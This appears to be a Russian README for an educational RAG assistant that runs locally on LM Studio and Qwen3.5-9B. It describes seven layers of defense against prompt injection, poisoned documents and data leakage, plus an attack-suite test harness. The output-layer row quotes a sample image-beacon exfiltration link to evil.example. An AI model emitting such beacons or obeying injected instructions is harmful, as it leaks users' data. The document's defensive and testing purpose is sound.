# Защищённый AI-агент: RAG-ассистент с семью слоями защиты (LM Studio + Qwen3.5-9B)

Веб-ассистент с базой знаний (RAG) и веб-поиском, усиленный семью слоями
защиты по методичке *secure_ai_agents*. **Модель и эмбеддинги — полностью
локально через [LM Studio](https://lmstudio.ai)** (OpenAI-совместимый API на
`http://localhost:1234/v1`): ни облака, ни ключей, ни torch. Каждый слой —
отдельный модуль с маленькой зоной ответственности; защита держится на коде,
а не на «вежливости» модели.

Результаты проверки:

| Прогон | Результат |
|---|---|
| Тесты слоёв (`pytest -q`) | **53/53 пройдено** |
| Набор атак, офлайн-имитация (`python scripts/run_attacks.py`) | **0 из 13 (0 %)** |
| Набор атак, живой LM Studio-протокол, «послушная» модель × 3 повтора | **0 из 39 (0 %)** |
| Набор атак, живой LM Studio-протокол, «злая» модель (выполняет все инъекции) × 3 | **0 из 39 (0 %)** |

Критерий выпуска (глава VIII методички): доля успешных атак ≤ 10 %,
обязательные — ни одной. Во всех четырёх прогонах — **ВЫПУСКАТЬ МОЖНО**.
Финальный прогон на настоящей Qwen3.5-9B — одна команда, см. раздел
«Проверка защиты».

## Семь слоёв защиты

| # | Слой | Файл | Что делает |
|---|------|------|------------|
| 1 | Вход | `input_layer.py` | Убирает невидимые символы (zero-width, теги направления письма), нормализует Unicode (NFKC), режет запросы длиннее лимита, ограничивает частоту запросов на токен |
| 2 | Промпт | `prompt_layer.py` | Системное сообщение без секретов; всё непроверенное (документы, поиск, история) — внутри `<document>`, закрыть тег изнутри нельзя |
| 3 | База знаний | `rag_layer.py` | Права чтения применяются **до** выборки top-k (гость не узнает, что HR-документ существует); символические ссылки отклоняются; скрытый текст (HTML-комментарии, `display:none`, белый текст) вычищается |
| 4 | Выход | `output_layer.py` | HTML экранируется; внешние ссылки и картинки удаляются (кроме белого списка хостов) — исключает утечку через картинку-маячок `![](https://evil.example/c?d=...)` |
| 5 | Шлюз инструментов | `gateway_layer.py` | Каждое действие проходит правило allow / ask / deny; `run_shell` запрещён всегда; в автономном цикле «ask» = «deny»; бюджет шагов обрывает зацикливание |
| 6 | Секреты | `secrets_layer.py` | Серверные токены сессий (TTL, потолок числа, отзыв); `redact()` маскирует ключи в логах, ошибках и строках состояния |
| 7 | Наблюдаемость | `obs_layer.py` | Журнал аудита без текста сообщений (длина + отпечаток sha256); тревога при всплеске трафика; kill-switch — файл-флаг мгновенно глушит агента |

## Быстрый старт (macOS)

Требуется **Python ≥ 3.8** (проверено на 3.8, 3.9 и 3.12) и
[LM Studio](https://lmstudio.ai) (модель Qwen3.5-9B, ~7 ГБ в квантовании
Q4_K_M).

### 1. LM Studio: модель и сервер

1. Установите LM Studio (файл `.dmg` с сайта) и скачайте в нём модель
   **Qwen3.5-9B** (вкладка Discover; подойдёт и любая другая чат-модель —
   агенту достаточно обычного чата, поддержка tools не нужна: он использует
   текстовый ReAct-протокол).
2. Для базы знаний скачайте любую embedding-модель, например
   **text-embedding-nomic-embed-text-v1.5**.
3. Вкладка **Developer** → загрузите обе модели → **Start Server**
   (порт 1234, включён переключатель «Serve on local network» не нужен).

Проверка из терминала:

```bash
curl http://localhost:1234/v1/models
```

### 2. Установка

```bash
cd secure_agent
python3 -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate
pip install -r requirements.txt
```

Torch ставить не нужно: и модель, и эмбеддинги считает LM Studio.

### 3. Настройка окружения

```bash
cp .env.example .env
```

По умолчанию `.env` уже настроен на LM Studio (`LLM_PROVIDER=lmstudio`);
ни ключей, ни адресов прописывать не нужно. Модель и embedding-модель
определяются автоматически (первая подходящая из загруженных в LM Studio);
можно задать явно `LLM_MODEL` и `EMBEDDING_MODEL`.

### 4. База знаний

Положите PDF-документы в `docs/knowledge_sources/`. Доступ по префиксу
имени файла:

* `hr_*.pdf` — видит только роль `hr` (зарплаты, премии);
* `dev_*.pdf` — видит только роль `dev` (архитектура, внутренние хосты);
* остальные файлы — видят все.

Префиксы настраиваются переменной `KB_RESTRICTED_PREFIXES`.

### 5. Запуск

```bash
python web_chat.py
```

Чат откроется на **http://127.0.0.1:5000** (страница `chat.html` отдаётся
маршрутом `GET /`). При старте печатается, какая модель и адрес выбраны.

## Подключение модели

Один клиент — все провайдеры говорят на OpenAI-совместимом API. Выбор —
переменной `LLM_PROVIDER` в `.env`:

| `LLM_PROVIDER` | Что это | Что нужно |
|---|---|---|
| `lmstudio` | LM Studio на вашем компьютере (по умолчанию) | запущенный сервер (порт 1234), загруженные модели |
| `ollama` | Локальный [Ollama](https://ollama.com) | установленный Ollama, загруженная модель |
| `custom` | Любой OpenAI-совместимый сервис (Groq, DeepSeek, Mistral, Yandex AI Studio…) | `LLM_BASE_URL`, `LLM_API_KEY`, `LLM_MODEL` |
| `mock` | Учебная «доверчивая» имитация — офлайн, без сети и ключей | ничего (но RAG недоступен: имитация не умеет эмбеддинги) |

Особенности:

* **Автоопределение модели**: имя берётся из `/v1/models` первой загруженной
  модели — не важно, как LM Studio назвал ваш Qwen. Переопределение — `LLM_MODEL`.
* **Эмбеддинги** — через `/v1/embeddings` того же сервера. embedding-модель
  выбирается автоматически (первая, отвечающая на этот эндпоинт) или явно
  (`EMBEDDING_MODEL`). Переключатель `EMBEDDING_PROVIDER` оставлен для
  офлайн-тестов (`sentence_transformers` + заглушка).
* **Qwen3.5 — «думающая» модель**: блоки размышлений `…`
  вырезаются до разбора ответа (`llm_provider.strip_think`), поэтому
  ReAct-парсер и пользователь видят только суть. Хотите ускорить ответы на
  слабом железе — `LLM_ENABLE_THINKING=0` попросит сервер не генерировать
  размышления вовсе.
* **Медленная модель — это нормально**: на CPU без ускорителя 9B-модель может
  отвечать десятки секунд. Таймаут задаётся `LLM_TIMEOUT_S` (по умолчанию 300 с).

Проверка подключения:

```bash
python3 -c "import llm_provider; print(llm_provider.describe()); print(llm_provider.probe())"
```

## HTTP API

| Метод | Путь | Тело (JSON) | Ответ |
|-------|------|-------------|-------|
| GET | `/` | — | страница `chat.html` |
| POST | `/api/session` | — | `{"token", "expires_at"}` — короткоживущий серверный токен (по умолчанию 30 мин) |
| POST | `/api/chat` | `{"message", "token", "role"}` | SSE-поток: `{"delta": ...}` … `[DONE]` |
| POST | `/api/reset` | `{"token"}` | очистка истории сессии |

Рекомендуемый порядок: сначала `POST /api/session` — серверный токен
(слой 6), затем его же передавать в `/api/chat`. Старый клиентский токен
сохранён как запасной вариант — сессии различаются и не конфликтуют.

`role` — права чтения базы знаний: `hr`, `dev` или пусто (гость `all`).
Неизвестные значения молча приводятся к `all`.

## Проверка защиты

Тесты и набор атак не требуют ни сети, ни ключей, ни LM Studio:
`offline_stubs.py` подкладывает детерминированные заглушки вместо
`flask`, `faiss`, `sentence-transformers`, `pypdf` и `ddgs`, а вместо
модели работает «доверчивая» имитация (`mock_llm.py`), которая послушно
исполняет любые инструкции из текста. Если даже она ничего не может
протащить — защиту держит код.

```bash
pip install -r requirements-dev.txt   # по сути просто pytest

pytest -q                             # 53 теста: 7 слоёв + сквозной
python scripts/run_attacks.py         # 13 атак, офлайн-имитация (код 0/1)
pytest tests/test_08_attack_suite.py  # те же атаки как pytest-тест
```

### Финальный прогон на живой модели (задание 8 методички)

Живая модель отвечает по-разному от запуска к запуску, поэтому каждую атаку
повторяют и считают долю успехов. При LM Studio с загруженным Qwen3.5-9B:

```bash
python scripts/run_attacks.py --provider lmstudio --repeat 3
python scripts/run_attacks.py --provider lmstudio --only A01,A09   # подмножество
python scripts/run_attacks.py --provider lmstudio --json out.json  # результаты в файл
```

Что делает скрипт:

* **предпроверка** — один короткий запрос к модели до начала атак; если
  LM Studio не запущен, подсказывает, что включить (код возврата 2);
* атаки идут через настоящий веб-слой (`POST /api/chat`) — проверяются все
  7 слоёв сразу; база знаний и «интернет» остаются учебными фикстурами, чтобы
  poisoned-атаки доходили до модели воспроизводимо;
* печатает прогресс по каждой попытке (сколько обращений к модели, длина ответа);
* **контроль валидности**: если во всех попытках атаки модель молчала
  (например, LM Studio выгрузил модель по Idle TTL), прогон объявляется
  невалидным (код 2) — «0 из 13» при молчащей модели ничего не доказывает.

Коды возврата: `0` — выпускать можно, `1` — нельзя, `2` — модель недоступна /
прогон невалиден.

## Оператору: выключатель и журнал

* **Экстренное отключение.** Создайте в корне проекта файл с именем из
  `AGENT_KILL_FLAG` (по умолчанию `STOP_AGENT`) — все эндпоинты начнут
  отвечать `503`, а текущие ответы оборвутся. Удалите файл, чтобы включить
  агента обратно.
* **Журнал аудита** пишется в `audit_log/audit.jsonl`: события `request`,
  `reply`, `rejected`, `rate_limited`, `tool:<имя>:<решение>`, `session_*`,
  `alert`. Текст сообщений в журнал **не попадает** — только длина и
  отпечаток sha256 (первые 12 символов), поэтому журнал можно показывать
  без риска для содержимого переписки.
* **Тревога.** При всплеске числа запросов в минуту в консоль выводится
  `⚠️ ALERT` и событие `alert` попадает в журнал.

## Ограничения (что осталось за кадром)

Осознанные упрощения учебного проекта — так их видно заранее:

* **Роль приходит от клиента** в `POST /api/chat` и только фильтруется по
  белому списку групп. Для продакшена роль следует брать из серверной
  сессии (например, из выпущенного токена `/api/session`), а не из тела
  запроса.
* **Токены и сессии — в памяти процесса**: перезапуск сервера сбрасывает
  их. Для нескольких инстансов нужен общий стор (Redis и т. п.).
* **Журнал аудита без ротации** — при большом трафике настройте
  logrotate или выносите в сборщик логов.
* Эмбеддинги и модель считаются на одном LM Studio-сервере: при
  одновременном чате и индексации базы знаний CPU будет общим.
